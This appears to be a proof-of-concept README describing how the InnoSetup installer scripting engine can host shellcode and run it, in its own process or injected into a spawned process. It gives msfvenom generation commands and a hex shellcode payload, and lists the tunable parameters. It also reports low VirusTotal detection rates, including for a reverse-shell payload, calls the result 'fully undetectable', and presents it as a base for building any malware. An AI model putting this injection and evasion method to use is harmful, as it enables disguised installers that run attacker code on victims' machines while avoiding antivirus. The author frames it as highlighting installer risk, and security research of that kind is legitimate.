# InnoSetup Execute Shellcode PoC

![Screenshot 2021-07-21 at 16.05.10.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.05.10.png)

This proof of concept illustrates how the InnoSetup Scripting Engine can be utilized to host a local or remote process shellcode payload and then execute it.

The motivation behind this concept is to highlight the potential risks associated with (self) installers. Not only can they harbor malicious programs, but they can also execute native code through their scripting engines. This method could potentially evade antivirus detections due to their seemingly benign nature.

The most challenging aspect of this project was understanding how to manipulate pointers and references. This example provides a foundation from which it is feasible to create any type of malware from scratch, including ones with increased complexity. Should you decide to experiment further, and encounter any technical queries, don't hesitate to ask for assistance.

## Parameters

The parameters can be found at the beginning of the InnoSetup Script File.

* **SpawnNewProcess:** (1|0): If this is set to 1, the payload will be stored and executed from a newly spawned process (default: notepad.exe). If set to 0, the payload will be stored and executed from the current InnoSetup Installer Process.
* **SpawnProcessName:** (STR): This parameter comes into play only if SpawnNewProcess is set to 1. You can modify this value to spawn the process of your choice.
* **verbose:** (1|0): Use this parameter to determine whether you want to generate debug messages (for example, from DbgView).
* **Payload:** (HEX_STR): This parameter is used to define the payload itself in hex format (aligned 2). If you're using Msfvenom, utilize the -f hex option.

## Example

Creating your own setup with a personalized payload is now straightforward.

Ensure that your shellcode is encoded in a hex string, and then replace the Payload parameter with your payload.

Here's an illustrative example using Msfvenom:

`msfvenom -p <payload> -a x86 --platform Windows <parameters> EXITFUNC=thread -f hex`

Example: `msfvenom -p windows/exec -a x86 --platform Windows CMD=calc.exe EXITFUNC=thread -f hex`

![Screenshot 2021-07-21 at 16.04.41.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.41.png)

```
#define Payload "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbe01d2a0a68a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
```

![Screenshot 2021-07-21 at 16.04.04.png](https://www.phrozen.io/media/all/Screenshot_2021-07-21_at_16.04.04.png)

You can modify the other parameters as per your needs before building your setup application to appreciate the result.

Please note: If you are using the **SpawnNewProcess** parameter, it is highly recommended to use the `ExitProcess` **EXITFUNC** method to terminate the entire spawned process, as opposed to using thread.

## VirusTotal Score (20 JULY 2021)

https://www.virustotal.com/gui/file/697f7d55aa19e9dfaa5b86d8117c4f57adaba1ea252e008d7760e0a192515ac8/detection

The current detection rate stands at 3/69, which is mostly due to generic detection because of the file's reputation. Therefore, it's highly probable that the file is fully undetectable (FUD).

![Screenshot 2021-07-20 at 19.09.53.png](https://www.phrozen.io/media/all/Screenshot_2021-07-20_at_19.09.53.png)

## VirusTotal Score (UPDATE: 21 JULY 2021)

Below are the results of a setup scan using a reverse shell payload from Msfvenom, without any encoding schema applied:

https://www.virustotal.com/gui/file/2723ba8196721a3fd8b792b195dc20928d53d0e8b21c47da353b894cace847b9/detection

With a detection rate of 4 out of 69, it successfully evades the majority of commonly used antivirus software.
